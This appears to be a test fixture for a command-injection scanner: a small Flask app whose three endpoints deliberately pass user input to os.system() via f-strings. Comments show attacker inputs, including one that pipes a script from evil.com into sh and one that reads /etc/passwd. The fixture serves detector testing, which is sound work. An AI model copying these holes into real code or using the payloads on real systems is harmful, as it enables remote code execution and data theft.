# Fixture: py-flask-os-system — os.system() with f-string injection
# Expected: TRUE POSITIVE (high confidence)
# CWE: CWE-78
# Agent: cmdi
# Pattern: User input interpolated into os.system() via f-string

import os
from flask import Flask, request, jsonify

app = Flask(__name__)

UPLOAD_DIR = "/var/app/uploads"


@app.route("/api/files/compress", methods=["POST"])
def compress_file():
    """Compress an uploaded file into a .tar.gz archive."""
    filename = request.json.get("filename")
    # VULNERABLE: f-string passes user-controlled filename directly to shell
    # Attacker sends: {"filename": "foo.txt; curl http://evil.com/shell.sh | sh"}
    os.system(f"tar -czf {UPLOAD_DIR}/{filename}.tar.gz -C {UPLOAD_DIR} {filename}")
    return jsonify({"status": "compressed", "archive": f"{filename}.tar.gz"})


@app.route("/api/logs/search")
def search_logs():
    """Search application logs for a given pattern."""
    pattern = request.args.get("pattern")
    log_file = request.args.get("file", "app.log")
    # VULNERABLE: both pattern and log_file are user-controlled
    # Attacker sends: ?pattern=error&file=app.log;+cat+/etc/passwd
    os.system(f"grep -i '{pattern}' /var/log/{log_file} > /tmp/search_results.txt")
    with open("/tmp/search_results.txt") as f:
        return jsonify({"results": f.readlines()})


@app.route("/api/health/ping")
def ping_host():
    """Ping a host to check connectivity."""
    host = request.args.get("host")
    # VULNERABLE: classic command injection via ping
    # Attacker sends: ?host=127.0.0.1;+id
    exit_code = os.system(f"ping -c 3 {host}")
    return jsonify({"reachable": exit_code == 0})
